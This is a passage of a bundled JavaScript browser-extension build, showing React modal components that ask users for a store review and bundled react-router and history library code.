            modal_asking_for_review_by_screenshots_ButtonClose = styled_components_browser_esm.a.button.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__ButtonClose",
                componentId: "sc-kop4qa-3",
            })`background-color:transparent;outline:none;border:none;cursor:pointer;position:relative;width:21px;height:21px;box-sizing:border-box;&::before,&::after{content:" ";display:block;position:absolute;width:18px;height:1px;top:9px;left:1px;background-color:${(
                props
            ) => props.border || "black"};}&::before{transform:rotate(-45deg);}&::after{transform:rotate(45deg);}`,
            modal_asking_for_review_by_screenshots_BodyContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__BodyContainer",
                componentId: "sc-kop4qa-4",
            })`display:flex;flex-direction:row;padding-top:9px;`,
            modal_asking_for_review_by_screenshots_BodyColumn = styled_components_browser_esm.a.div.withConfig({ displayName: "modal-asking-for-review-by-screenshots__BodyColumn", componentId: "sc-kop4qa-5" })`min-width:390px;${(props) =>
                "rtl" === props.dir ? "margin-right: 10px;" : "margin-left: 10px;"}`,
            modal_asking_for_review_by_screenshots_BodyText = styled_components_browser_esm.a.span.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__BodyText",
                componentId: "sc-kop4qa-6",
            })`font-size:17px;line-height:30px;color:${(props) => props.color};& b{font-weight:bold;color:${(props) => props.color2};}`,
            modal_asking_for_review_by_screenshots_StarsContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__StarsContainer",
                componentId: "sc-kop4qa-7",
            })`display:flex;flex-direction:row;align-items:center;justify-content:center;padding:7px 0;& svg{&:not(:last-child){margin:0 9px;}&:last-child{transform:translateY(4px);margin:0 2px;}& path{fill:${(props) =>
                props.iconColor};}}`,
            modal_asking_for_review_by_screenshots_FooterContainer = styled_components_browser_esm.a.div.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__FooterContainer",
                componentId: "sc-kop4qa-8",
            })`display:flex;flex-direction:row;align-items:center;justify-content:space-between;padding-top:14px;& button{margin:0;&:first-child{padding:16px 28px;}&:last-child{padding:16px 60px;& span{font-weight:bold;}}}`,
            modal_asking_for_review_by_screenshots_ButtonUnderline = styled_components_browser_esm.a.button.withConfig({
                displayName: "modal-asking-for-review-by-screenshots__ButtonUnderline",
                componentId: "sc-kop4qa-9",
            })`outline:none;border:none;padding:6px 8px;margin:0 auto 24px;display:block;cursor:pointer;font-size:16px;text-decoration:underline;background-color:transparent;color:${(props) => props.color};&:hover{color:${(props) =>
                props.hover};}`,
            modal_asking_for_review_by_screenshots_Header = ({ close: close }) => {
                const { extensionName: extensionName } = config.a,
                    { t: t } = useTranslation(),
                    { dir: dir, theme: theme, setRatingModalLastNotNow: setRatingModalLastNotNow } = use_app_state(["dir", "theme", "setRatingModalLastNotNow"]),
                    modalNotificationStyles = theme && theme.modal_notification,
                    headerBorder = modalNotificationStyles && modalNotificationStyles.header_border,
                    titleColor = modalNotificationStyles && modalNotificationStyles.modal_title,
                    closeButtonBorder = modalNotificationStyles && modalNotificationStyles.close_button;
                return react_default.a.createElement(
                    modal_asking_for_review_by_screenshots_HeaderContainer,
                    { headerBorder: headerBorder },
                    react_default.a.createElement(
                        modal_asking_for_review_by_screenshots_TitleContainer,
                        null,
                        react_default.a.createElement(like, null),
                        react_default.a.createElement(modal_asking_for_review_by_screenshots_Title, { dir: dir, color: titleColor }, t("social_media_sharing.help_extension_to_get_better", { extensionName: extensionName }))
                    ),
                    react_default.a.createElement(modal_asking_for_review_by_screenshots_ButtonClose, {
                        onClick: () => {
                            setRatingModalLastNotNow(Date.now()), close();
                        },
                        border: closeButtonBorder,
                    })
                );
            },
            modal_asking_for_review_by_screenshots_Body = ({ close: close }) => {
                const { t: t } = useTranslation(),
                    { dir: dir, theme: theme, screenshotsCount: screenshotsCount, eventRouter: eventRouter } = use_app_state(["dir", "theme", "screenshotsCount", "eventRouter"]),
                    modalNotificationStyles = theme && theme.modal_notification,
                    iconColor = modalNotificationStyles && modalNotificationStyles.modal_icon_color,
                    iconColor2 = modalNotificationStyles && modalNotificationStyles.modal_icon_color2,
                    iconColor3 = modalNotificationStyles && modalNotificationStyles.modal_icon_color3,
                    bodyColor = modalNotificationStyles && modalNotificationStyles.modal_body,
                    bodyColor2 = modalNotificationStyles && modalNotificationStyles.modal_body2,
                    redirectToStore = () => {
                        console.log("We was rated!!!", config.a), window.open(config.a.ratingUrl, "_blank").focus(), eventRouter.emit("userRedirectedToStore", "askingForReviewByScreenshots"), close();
                    };
                return react_default.a.createElement(
                    modal_asking_for_review_by_screenshots_BodyContainer,
                    null,
                    react_default.a.createElement(shining_star_outline, { color: iconColor, color2: iconColor2, style: { margin: "10px 8px" } }),
                    react_default.a.createElement(
                        modal_asking_for_review_by_screenshots_BodyColumn,
                        { dir: dir },
                        react_default.a.createElement(
                            modal_asking_for_review_by_screenshots_BodyText,
                            { color: bodyColor, color2: bodyColor2 },
                            react_default.a.createElement(
                                Trans,
                                { i18nKey: "social_media_sharing.asking_for_review_by_screenshots", count: screenshotsCount, values: { screenshotsCount: screenshotsCount } },
                                "You've successfully made ",
                                screenshotsCount,
                                " ",
                                t("social_media_sharing.screenshot"),
                                ".",
                                react_default.a.createElement("br", null),
                                "We would be grateful for the review and ",
                                react_default.a.createElement("b", null, "5 stars"),
                                " ;)",
                                react_default.a.createElement("br", null),
                                "It's really important for development."
                            )
                        ),
                        react_default.a.createElement(
                            modal_asking_for_review_by_screenshots_StarsContainer,
                            { iconColor: iconColor3 },
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(star, { onClick: redirectToStore }),
                            react_default.a.createElement(shining_star, { onClick: redirectToStore })
                        )
                    )
                );
            },
            modal_asking_for_review_by_screenshots_Footer = ({ close: close }) => {
                const { theme: theme, setRatingModalLastNotNow: setRatingModalLastNotNow, eventRouter: eventRouter } = use_app_state(["theme", "setRatingModalLastNotNow", "eventRouter"]),
                    { t: t } = useTranslation(),
                    modalNotificationStyles = theme && theme.modal_notification,
                    buttonUnderline = modalNotificationStyles && modalNotificationStyles.button_underline,
                    color = buttonUnderline && buttonUnderline.color,
                    hover = buttonUnderline && buttonUnderline.hover;
                return react_default.a.createElement(
                    modal_asking_for_review_by_screenshots_FooterContainer,
                    null,
                    react_default.a.createElement(
                        modal_asking_for_review_by_screenshots_ButtonUnderline,
                        {
                            color: color,
                            hover: hover,
                            onClick: () => {
                                setRatingModalLastNotNow(Date.now()), close();
                            },
                        },
                        t("social_media_sharing.button_cancel_rate")
                    ),
                    react_default.a.createElement(ui_button, {
                        onClick: () => {
                            console.log("We was rated!!!", config.a), window.open(config.a.ratingUrl, "_blank").focus(), eventRouter.emit("userRedirectedToStore", "askingForReviewByScreenshots"), close();
                        },
                        text: t("social_media_sharing.button_rate"),
                    })
                );
            };
        let modals_pageYOffset;
        const modalsComponents = {
            askingForReviewByDownloads: ({ theLast: theLast, close: close }) => {
                const { setRatingModalLastNotNow: setRatingModalLastNotNow } = use_app_state(["setRatingModalLastNotNow"]);
                return react_default.a.createElement(
                    modals_modal,
                    {
                        theLast: theLast,
                        close: () => {
                            setRatingModalLastNotNow(Date.now()), close();
                        },
                    },
                    react_default.a.createElement(modal_asking_for_review_by_downloads_Header, { close: close }),
                    react_default.a.createElement(Body, { close: close }),
                    react_default.a.createElement(Footer, { close: close })
                );
            },
            askingForReviewByScreenshots: ({ theLast: theLast, close: close }) => {
                const { setRatingModalLastNotNow: setRatingModalLastNotNow } = use_app_state(["setRatingModalLastNotNow"]);
                return react_default.a.createElement(
                    modals_modal,
                    {
                        theLast: theLast,
                        close: () => {
                            setRatingModalLastNotNow(Date.now()), close();
                        },
                    },
                    react_default.a.createElement(modal_asking_for_review_by_screenshots_Header, { close: close }),
                    react_default.a.createElement(modal_asking_for_review_by_screenshots_Body, { close: close }),
                    react_default.a.createElement(modal_asking_for_review_by_screenshots_Footer, { close: close })
                );
            },
        };
        var modals_modals = ({ modals: modals }) => {
                const { removeModal: removeModal, publicIds: publicIds } = use_app_state(["removeModal", "publicIds"]),
                    { modal: modalId, modalBodyClassName: modalBodyClassName } = publicIds,
                    modalHolder = document.getElementById(modalId),
                    [isModalsShown, setIsModalsShown] = Object(react.useState)(!1);
                if (
                    (Object(react.useEffect)(() => {
                        setIsModalsShown(modalHolder && modals.length > 0);
                    }, [modalHolder, modals]),
                    Object(react.useEffect)(() => {
                        isModalsShown
                            ? ((modals_pageYOffset = window.pageYOffset), document.body.classList.add(modalBodyClassName), (document.body.style.marginTop = -modals_pageYOffset + "px"))
                            : document.body.querySelector("#" + modalId) && ((document.body.style.marginTop = ""), document.body.classList.remove(modalBodyClassName), window.scrollTo(0, modals_pageYOffset));
                    }, [isModalsShown, modalId, modalBodyClassName]),
                    isModalsShown)
                ) {
                    const dom = modals.reduce((result, item, index) => {
                        const Modal = modalsComponents[item.modalType];
                        if (Modal) {
                            const close = () => removeModal(item.id);
                            result.push(react_default.a.createElement(Modal, { key: item.id, id: item.id, theLast: index === modals.length - 1, close: close }));
                        }
                        return result;
                    }, []);
                    return Object(react_dom.createPortal)(dom, modalHolder);
                }
                return null;
            },
            ui_modals = () => {
                const { modals: modals } = use_app_state(["modals"]),
                    notifications = modals.filter((rec) => "notification" === rec.type),
                    modalsList = modals.filter((rec) => "modal" === rec.type);
                return react_default.a.createElement(
                    react_default.a.Fragment,
                    null,
                    react_default.a.createElement(modals_notifications, { notifications: notifications }),
                    react_default.a.createElement(modals_modals, { modals: modalsList })
                );
            };
        var icons_warning = ({ style: style, color: color, className: className }) =>
            react_default.a.createElement(
                "svg",
                { xmlns: "http://www.w3.org/2000/svg", width: "80px", height: "73.7px", viewBox: "0 0 80 73.7", style: style, className: className },
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M37.6,0.5c1.5-0.7,3.3-0.7,4.9,0c1.2,0.5,2.3,1.5,3,2.6C56.7,23.6,68,44, 79.2,64.5c0.4,0.8,0.6,1.6,0.7,2.5v0.9c-0.2,2.4-1.8,4.7-4.1,5.5c-1.2, 0.5-2.5,0.3-3.8,0.4c-8.3,0-16.6,0-24.8,0c-0.6,0-1.1-0.2-1.4-0.7c-0.5-0.6-0.3-1.6, 0.3-2.1c0.5-0.4,1.3-0.3,1.9-0.3c8.6,0,17.2,0,25.8,0c1.5,0,2.9-1.2, 3.1-2.8c0.1-0.7-0.1-1.3-0.4-1.9C65.2,45.5,54,25.2,42.8, 4.8c-0.5-1-1.5-1.7-2.6-1.7c-1.2-0.1-2.3,0.6-2.9,1.6C26,25.1,14.8,45.5,3.5, 66c-0.8,1.3-0.3,3.2,1,4c0.6,0.4,1.3,0.6,2.1,0.5c8.5,0,17,0,25.5,0c0.6,0, 1.3-0.1,1.8,0.3c0.7,0.4,0.9,1.4,0.5,2.1c-0.3,0.5-0.9,0.8-1.5,0.8c-8.3, 0-16.6,0-24.9,0c-1.3,0-2.6,0.1-3.8-0.3c-2.3-0.8-4-3.1-4.2-5.5V67c0.1-1.8, 1.2-3.2,2-4.7C12.9,42.5,23.7,22.8,34.6,3.1C35.2,2,36.3,1,37.6,0.5z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M38.8,19.1c1.5-0.3,3.1,0,4.5,0.8c1.4,0.9,2.4,2.3,2.8,3.9c0.2,1,0.1,2,0.2, 2.9c0,4.1,0,8.2,0,12.4c0,1.4-0.4,2.8-1.3,3.9c-1.1,1.4-2.7,2.3-4.5,2.4c-1.9, 0.2-3.8-0.6-5.1-2c-1.1-1.2-1.6-2.7-1.6-4.3c0-4.7,0-9.5,0-14.2C33.8,22.1, 36.1,19.6,38.8,19.1M39.4,22.2c-1.1,0.2-2.1,1.1-2.4,2.1c-0.1,0.5-0.1, 0.9-0.1,1.4c0,4.5,0,9.1,0,13.6c0,1.5,1.1,2.8,2.5,3c1.4,0.3,2.9-0.5, 3.4-1.8c0.4-0.8,0.3-1.8,0.3-2.7c0-4.3,0-8.5,0-12.8C43.1,23.3,41.2,21.8,39.4,22.2z",
                }),
                react_default.a.createElement("path", {
                    fill: color,
                    d:
                        "M38.8,51.9c1.7-0.3,3.6,0.1,5,1.2c2.4,1.8,3.1,5.4,1.6,8c-0.9,1.6-2.5,2.7-4.3, 3c-2,0.4-4.2-0.4-5.6-1.9c-1.4-1.5-2-3.7-1.5-5.6C34.4,54.3,36.4,52.4,38.8, 51.9 M39.1,55.1c-1.1,0.3-2.1,1.4-2.2,2.5c-0.2,1,0.3,2.2,1.1,2.8c0.9,0.8,2.2, 1,3.3,0.5c1-0.4,1.7-1.3,1.8-2.3c0.2-1.1-0.2-2.3-1.1-2.9C41.2,55,40.1,54.8,39.1,55.1z",
                }),
                react_default.a.createElement("path", { fill: color, d: "M39.4,70.6c1.1-0.5,2.4,0.5,2.1,1.7c-0.1,1.1-1.6,1.7-2.5,1C38.1,72.6,38.3,71,39.4,70.6z" })
            );
        var lightning = ({ style: style, color: color, className: className }) =>
                react_default.a.createElement(
                    "svg",
                    { xmlns: "http://www.w3.org/2000/svg", width: "80px", height: "73.95px", viewBox: "0 0 80 73.95", style: style, className: className },
                    react_default.a.createElement("path", {
                        fill: color,
                        d:
                            " M 15.9 70.75 Q 15.35 71.3 15.35 72.05 15.35 72.85 15.9 73.4 16.45 73.9 17.2 73.9 18 73.9 18.5 73.35 19.05 72.85 19.05 72.05 19.05 71.3 18.5 70.75 18 70.2 17.2 70.2 16.45 70.2 15.9 70.75 M 38.4 4.65 Q 38.9 3.65 40 3.65 41.1 3.65 41.6 4.65 L 76.1 67.65 Q 76.5 68.45 75.95 69.35 75.4 70.2 74.4 70.2 L 24.6 70.2 Q 23.85 70.2 23.3 70.75 22.75 71.3 22.75 72.05 22.75 72.85 23.3 73.4 23.8 73.9 24.6 73.9 L 74.4 73.9 Q 77.5 73.9 79.15 71.2 80.7 68.6 79.35 65.95 L 79.35 65.9 44.9 2.9 Q 43.3 0 40 0 36.65 0 35.1 2.9 L 0.7 65.8 Q -0.75 68.6 0.9 71.25 2.55 73.95 5.65 73.95 L 9.8 73.95 Q 10.55 73.95 11.1 73.4 11.65 72.9 11.65 72.1 11.65 71.3 11.05 70.75 10.55 70.25 9.8 70.25 L 5.65 70.25 Q 4.55 70.25 4.05 69.35 3.5 68.5 3.95 67.55 L 38.4 4.65 M 41.85 16.6 Q 41.85 15.95 41.45 15.45 41 14.9 40.35 14.8 39.75 14.65 39.15 14.95 38.55 15.3 38.3 15.9 L 27.2 43.65 Q 26.85 44.65 27.4 45.35 27.9 46.15 28.95 46.15 L 38.15 46.15 38.15 64.65 Q 38.15 65.3 38.55 65.85 39.05 66.4 39.65 66.45 40.3 66.6 40.9 66.3 41.5 66 41.7 65.35 L 52.85 37.65 Q 53.15 36.65 52.65 35.85 52.1 35.1 51.15 35.1 L 41.85 35.1 41.85 16.6 M 41.85 44.3 Q 41.85 43.6 41.3 43.05 40.8 42.45 40 42.45 L 31.65 42.45 38.15 26.2 38.15 36.95 Q 38.15 37.7 38.7 38.25 39.25 38.8 40 38.8 L 48.35 38.8 41.85 55.05 41.85 44.3 Z",
                    })
                ),
            inheritsLoose = __webpack_require__(14);
        function isAbsolute(pathname) {
            return "/" === pathname.charAt(0);
        }
        function spliceOne(list, index) {
            for (var i = index, k = i + 1, n = list.length; k < n; i += 1, k += 1) list[i] = list[k];
            list.pop();
        }
        var resolve_pathname = function (to, from) {
            void 0 === from && (from = "");
            var hasTrailingSlash,
                toParts = (to && to.split("/")) || [],
                fromParts = (from && from.split("/")) || [],
                isToAbs = to && isAbsolute(to),
                isFromAbs = from && isAbsolute(from),
                mustEndAbs = isToAbs || isFromAbs;
            if ((to && isAbsolute(to) ? (fromParts = toParts) : toParts.length && (fromParts.pop(), (fromParts = fromParts.concat(toParts))), !fromParts.length)) return "/";
            if (fromParts.length) {
                var last = fromParts[fromParts.length - 1];
                hasTrailingSlash = "." === last || ".." === last || "" === last;
            } else hasTrailingSlash = !1;
            for (var up = 0, i = fromParts.length; i >= 0; i--) {
                var part = fromParts[i];
                "." === part ? spliceOne(fromParts, i) : ".." === part ? (spliceOne(fromParts, i), up++) : up && (spliceOne(fromParts, i), up--);
            }
            if (!mustEndAbs) for (; up--; up) fromParts.unshift("..");
            !mustEndAbs || "" === fromParts[0] || (fromParts[0] && isAbsolute(fromParts[0])) || fromParts.unshift("");
            var result = fromParts.join("/");
            return hasTrailingSlash && "/" !== result.substr(-1) && (result += "/"), result;
        };
        var prefix = "Invariant failed";
        function invariant(condition, message) {
            if (!condition) throw new Error(prefix);
        }
        function createPath(location) {
            var pathname = location.pathname,
                search = location.search,
                hash = location.hash,
                path = pathname || "/";
            return search && "?" !== search && (path += "?" === search.charAt(0) ? search : "?" + search), hash && "#" !== hash && (path += "#" === hash.charAt(0) ? hash : "#" + hash), path;
        }
        function createLocation(path, state, key, currentLocation) {
            var location;
            "string" == typeof path
                ? ((location = (function (path) {
                      var pathname = path || "/",
                          search = "",
                          hash = "",
                          hashIndex = pathname.indexOf("#");
                      -1 !== hashIndex && ((hash = pathname.substr(hashIndex)), (pathname = pathname.substr(0, hashIndex)));
                      var searchIndex = pathname.indexOf("?");
                      return -1 !== searchIndex && ((search = pathname.substr(searchIndex)), (pathname = pathname.substr(0, searchIndex))), { pathname: pathname, search: "?" === search ? "" : search, hash: "#" === hash ? "" : hash };
                  })(path)).state = state)
                : (void 0 === (location = _extends({}, path)).pathname && (location.pathname = ""),
                  location.search ? "?" !== location.search.charAt(0) && (location.search = "?" + location.search) : (location.search = ""),
                  location.hash ? "#" !== location.hash.charAt(0) && (location.hash = "#" + location.hash) : (location.hash = ""),
                  void 0 !== state && void 0 === location.state && (location.state = state));
            try {
                location.pathname = decodeURI(location.pathname);
            } catch (e) {
                throw e instanceof URIError ? new URIError('Pathname "' + location.pathname + '" could not be decoded. This is likely caused by an invalid percent-encoding.') : e;
            }
            return (
                key && (location.key = key),
                currentLocation
                    ? location.pathname
                        ? "/" !== location.pathname.charAt(0) && (location.pathname = resolve_pathname(location.pathname, currentLocation.pathname))
                        : (location.pathname = currentLocation.pathname)
                    : location.pathname || (location.pathname = "/"),
                location
            );
        }
        function createTransitionManager() {
            var prompt = null;
            var listeners = [];
            return {
                setPrompt: function (nextPrompt) {
                    return (
                        (prompt = nextPrompt),
                        function () {
                            prompt === nextPrompt && (prompt = null);
                        }
                    );
                },
                confirmTransitionTo: function (location, action, getUserConfirmation, callback) {
                    if (null != prompt) {
                        var result = "function" == typeof prompt ? prompt(location, action) : prompt;
                        "string" == typeof result ? ("function" == typeof getUserConfirmation ? getUserConfirmation(result, callback) : callback(!0)) : callback(!1 !== result);
                    } else callback(!0);
                },
                appendListener: function (fn) {
                    var isActive = !0;
                    function listener() {
                        isActive && fn.apply(void 0, arguments);
                    }
                    return (
                        listeners.push(listener),
                        function () {
                            (isActive = !1),
                                (listeners = listeners.filter(function (item) {
                                    return item !== listener;
                                }));
                        }
                    );
                },
                notifyListeners: function () {
                    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                    listeners.forEach(function (listener) {
                        return listener.apply(void 0, args);
                    });
                },
            };
        }
        "undefined" == typeof window || !window.document || window.document.createElement;
        function clamp(n, lowerBound, upperBound) {
            return Math.min(Math.max(n, lowerBound), upperBound);
        }
        function createMemoryHistory(props) {
            void 0 === props && (props = {});
            var _props = props,
                getUserConfirmation = _props.getUserConfirmation,
                _props$initialEntries = _props.initialEntries,
                initialEntries = void 0 === _props$initialEntries ? ["/"] : _props$initialEntries,
                _props$initialIndex = _props.initialIndex,
                initialIndex = void 0 === _props$initialIndex ? 0 : _props$initialIndex,
                _props$keyLength = _props.keyLength,
                keyLength = void 0 === _props$keyLength ? 6 : _props$keyLength,
                transitionManager = createTransitionManager();
            function setState(nextState) {
                _extends(history, nextState), (history.length = history.entries.length), transitionManager.notifyListeners(history.location, history.action);
            }
            function createKey() {
                return Math.random().toString(36).substr(2, keyLength);
            }
            var index = clamp(initialIndex, 0, initialEntries.length - 1),
                entries = initialEntries.map(function (entry) {
                    return createLocation(entry, void 0, "string" == typeof entry ? createKey() : entry.key || createKey());
                }),
                createHref = createPath;
            function go(n) {
                var nextIndex = clamp(history.index + n, 0, history.entries.length - 1),
                    location = history.entries[nextIndex];
                transitionManager.confirmTransitionTo(location, "POP", getUserConfirmation, function (ok) {
                    ok ? setState({ action: "POP", location: location, index: nextIndex }) : setState();
                });
            }
            var history = {
                length: entries.length,
                action: "POP",
                location: entries[index],
                index: index,
                entries: entries,
                createHref: createHref,
                push: function (path, state) {
                    var location = createLocation(path, state, createKey(), history.location);
                    transitionManager.confirmTransitionTo(location, "PUSH", getUserConfirmation, function (ok) {
                        if (ok) {
                            var nextIndex = history.index + 1,
                                nextEntries = history.entries.slice(0);
                            nextEntries.length > nextIndex ? nextEntries.splice(nextIndex, nextEntries.length - nextIndex, location) : nextEntries.push(location),
                                setState({ action: "PUSH", location: location, index: nextIndex, entries: nextEntries });
                        }
                    });
                },
                replace: function (path, state) {
                    var location = createLocation(path, state, createKey(), history.location);
                    transitionManager.confirmTransitionTo(location, "REPLACE", getUserConfirmation, function (ok) {
                        ok && ((history.entries[history.index] = location), setState({ action: "REPLACE", location: location }));
                    });
                },
                go: go,
                goBack: function () {
                    go(-1);
                },
                goForward: function () {
                    go(1);
                },
                canGo: function (n) {
                    var nextIndex = history.index + n;
                    return nextIndex >= 0 && nextIndex < history.entries.length;
                },
                block: function (prompt) {
                    return void 0 === prompt && (prompt = !1), transitionManager.setPrompt(prompt);
                },
                listen: function (listener) {
                    return transitionManager.appendListener(listener);
                },
            };
            return history;
        }
        var esm = __webpack_require__(71),
            path_to_regexp = __webpack_require__(72),
            path_to_regexp_default = __webpack_require__.n(path_to_regexp),
            historyContext =
                (__webpack_require__(182),
                (function (name) {
                    var context = Object(esm.a)();
                    return (context.displayName = name), context;
                })("Router-History")),
            react_router_context = (function (name) {
                var context = Object(esm.a)();
                return (context.displayName = name), context;
            })("Router"),
            react_router_Router = (function (_React$Component) {
                function Router(props) {
                    var _this;
                    return (
                        ((_this = _React$Component.call(this, props) || this).state = { location: props.history.location }),
                        (_this._isMounted = !1),
                        (_this._pendingLocation = null),
                        props.staticContext ||
                            (_this.unlisten = props.history.listen(function (location) {
                                _this._isMounted ? _this.setState({ location: location }) : (_this._pendingLocation = location);
                            })),
                        _this
                    );
                }
                Object(inheritsLoose.a)(Router, _React$Component),
                    (Router.computeRootMatch = function (pathname) {
                        return { path: "/", url: "/", params: {}, isExact: "/" === pathname };
                    });
                var _proto = Router.prototype;
                return (
                    (_proto.componentDidMount = function () {
                        (this._isMounted = !0), this._pendingLocation && this.setState({ location: this._pendingLocation });
                    }),
                    (_proto.componentWillUnmount = function () {
                        this.unlisten && this.unlisten();
                    }),
                    (_proto.render = function () {
                        return react_default.a.createElement(
                            react_router_context.Provider,
                            { value: { history: this.props.history, location: this.state.location, match: Router.computeRootMatch(this.state.location.pathname), staticContext: this.props.staticContext } },
                            react_default.a.createElement(historyContext.Provider, { children: this.props.children || null, value: this.props.history })
                        );
                    }),
                    Router
                );
            })(react_default.a.Component);
        var react_router_MemoryRouter = (function (_React$Component) {
            function MemoryRouter() {
                for (var _this, _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                return ((_this = _React$Component.call.apply(_React$Component, [this].concat(args)) || this).history = createMemoryHistory(_this.props)), _this;
            }
            return (
                Object(inheritsLoose.a)(MemoryRouter, _React$Component),
                (MemoryRouter.prototype.render = function () {
                    return react_default.a.createElement(react_router_Router, { history: this.history, children: this.props.children });
                }),
                MemoryRouter
            );
        })(react_default.a.Component);
        react_default.a.Component;
        var cache$1 = {},
            cacheCount$1 = 0;
        function matchPath(pathname, options) {
            void 0 === options && (options = {}), ("string" == typeof options || Array.isArray(options)) && (options = { path: options });
            var _options = options,
                path = _options.path,
                _options$exact = _options.exact,
                exact = void 0 !== _options$exact && _options$exact,
                _options$strict = _options.strict,
                strict = void 0 !== _options$strict && _options$strict,
                _options$sensitive = _options.sensitive,
                sensitive = void 0 !== _options$sensitive && _options$sensitive;
            return [].concat(path).reduce(function (matched, path) {
                if (!path && "" !== path) return null;
                if (matched) return matched;
                var _compilePath = (function (path, options) {
                        var cacheKey = "" + options.end + options.strict + options.sensitive,
                            pathCache = cache$1[cacheKey] || (cache$1[cacheKey] = {});
                        if (pathCache[path]) return pathCache[path];
                        var keys = [],
                            result = { regexp: path_to_regexp_default()(path, keys, options), keys: keys };
                        return cacheCount$1 < 1e4 && ((pathCache[path] = result), cacheCount$1++), result;
                    })(path, { end: exact, strict: strict, sensitive: sensitive }),
                    regexp = _compilePath.regexp,
                    keys = _compilePath.keys,
                    match = regexp.exec(pathname);
                if (!match) return null;
                var url = match[0],
                    values = match.slice(1),
                    isExact = pathname === url;
                return exact && !isExact
                    ? null
                    : {
                          path: path,
                          url: "/" === path && "" === url ? "/" : url,
                          isExact: isExact,
                          params: keys.reduce(function (memo, key, index) {
                              return (memo[key.name] = values[index]), memo;
                          }, {}),
                      };
            }, null);
        }
        var react_router_Route = (function (_React$Component) {
            function Route() {
                return _React$Component.apply(this, arguments) || this;
            }
            return (
                Object(inheritsLoose.a)(Route, _React$Component),
                (Route.prototype.render = function () {
                    var _this = this;
                    return react_default.a.createElement(react_router_context.Consumer, null, function (context$1) {
                        context$1 || invariant(!1);
                        var location = _this.props.location || context$1.location,
                            props = _extends({}, context$1, { location: location, match: _this.props.computedMatch ? _this.props.computedMatch : _this.props.path ? matchPath(location.pathname, _this.props) : context$1.match }),
                            _this$props = _this.props,
                            children = _this$props.children,
                            component = _this$props.component,
                            render = _this$props.render;
                        return (
                            Array.isArray(children) && 0 === children.length && (children = null),
                            react_default.a.createElement(
                                react_router_context.Provider,
                                { value: props },
                                props.match
                                    ? children
                                        ? "function" == typeof children
                                            ? children(props)
                                            : children
                                        : component
                                        ? react_default.a.createElement(component, props)
                                        : render
                                        ? render(props)
                                        : null
                                    : "function" == typeof children
                                    ? children(props)
                                    : null
                            )
                        );
                    });
                }),
                Route
            );
        })(react_default.a.Component);
        function react_router_addLeadingSlash(path) {
            return "/" === path.charAt(0) ? path : "/" + path;
        }
        function react_router_stripBasename(basename, location) {
            if (!basename) return location;
            var base = react_router_addLeadingSlash(basename);
            return 0 !== location.pathname.indexOf(base) ? location : _extends({}, location, { pathname: location.pathname.substr(base.length) });
        }
        function createURL(location) {
            return "string" == typeof location ? location : createPath(location);
        }
        function staticHandler(methodName) {
            return function () {
                invariant(!1);
            };
        }
        function noop() {}
        react_default.a.Component;
        var react_router_Switch = (function (_React$Component) {
            function Switch() {
                return _React$Component.apply(this, arguments) || this;
            }
            return (
                Object(inheritsLoose.a)(Switch, _React$Component),
                (Switch.prototype.render = function () {
                    var _this = this;
                    return react_default.a.createElement(react_router_context.Consumer, null, function (context) {
                        context || invariant(!1);
                        var element,
                            match,
                            location = _this.props.location || context.location;
                        return (
                            react_default.a.Children.forEach(_this.props.children, function (child) {
                                if (null == match && react_default.a.isValidElement(child)) {
                                    element = child;
                                    var path = child.props.path || child.props.from;
                                    match = path ? matchPath(location.pathname, _extends({}, child.props, { path: path })) : context.match;
                                }
                            }),
                            match ? react_default.a.cloneElement(element, { location: location, computedMatch: match }) : null
                        );
                    });
                }),
                Switch
            );
        })(react_default.a.Component);
        var useContext = react_default.a.useContext;
        function useHistory() {
            return useContext(historyContext);
        }
        function useLocation() {
            return useContext(react_router_context).location;
        }
        const ScrollContainer = styled_components_browser_esm.a.div.withConfig({ displayName: "scroll-container__ScrollContainer", componentId: "sc-1vk2yae-0" })`box-sizing:border-box;overflow-x:hidden;overflow-y:auto;max-height:${(
            props
        ) => (props.maxHeight ? props.maxHeight + "px" : "none")};margin-left:${(props) => props.marginLeft}px;margin-right:${(props) => props.marginRight}px;padding-left:${(props) => props.paddingLeft}px;padding-right:${(props) =>
            props.paddingRight}px;padding-bottom:${(props) => props.paddingBottom}px;&::-webkit-scrollbar{width:4px !important;border:1px solid ${(props) => props.scrollbarBorder};}&::-webkit-scrollbar-thumb{background-color:${(props) =>
            props.scrollbarThumb};}scrollbar-color:${(props) => props.scrollbarThumb} ${(props) => props.scrollbarBackgroundFirefox};scrollbar-width:thin;`;
        var scroll_container = ({ children: children, scrollTop: scrollTop, onScroll: onScroll, paddingHorizontal: paddingHorizontal, maxHeight: maxHeight, scrollPaddingBottom: scrollPaddingBottom }) => {
            const { dir: dir, theme: theme } = use_app_state(["dir", "theme"]),
                [containerNode, setContainerNode] = Object(react.useState)(null),
                [marginLeft, setMarginLeft] = Object(react.useState)(0),
                [marginRight, setMarginRight] = Object(react.useState)(0),
                [paddingLeft, setPaddingLeft] = Object(react.useState)(0),
                [paddingRight, setPaddingRight] = Object(react.useState)(0),
                [paddingBottom, setPaddingBottom] = Object(react.useState)(0),
                scrollbarStyles = theme && theme.scrollbar,
                scrollbarBackground = scrollbarStyles && scrollbarStyles.background,
                scrollbarBackgroundFirefox = scrollbarStyles && scrollbarStyles.background_firefox,
                scrollbarBorder = scrollbarStyles && scrollbarStyles.border,
                scrollbarThumb = scrollbarStyles && scrollbarStyles.thumb,
                resizeObserver = new ResizeObserver(() => {
                    const { offsetHeight: offsetHeight, scrollHeight: scrollHeight } = containerNode,
                        hasScrollbar = scrollHeight > offsetHeight,
                        hasScrollbarLTR = hasScrollbar && "ltr" === dir,
                        hasScrollbarRTL = hasScrollbar && "rtl" === dir;
                    if ((setMarginLeft(hasScrollbarRTL ? 8 : 0), setMarginRight(hasScrollbarLTR ? 8 : 0), paddingHorizontal)) {
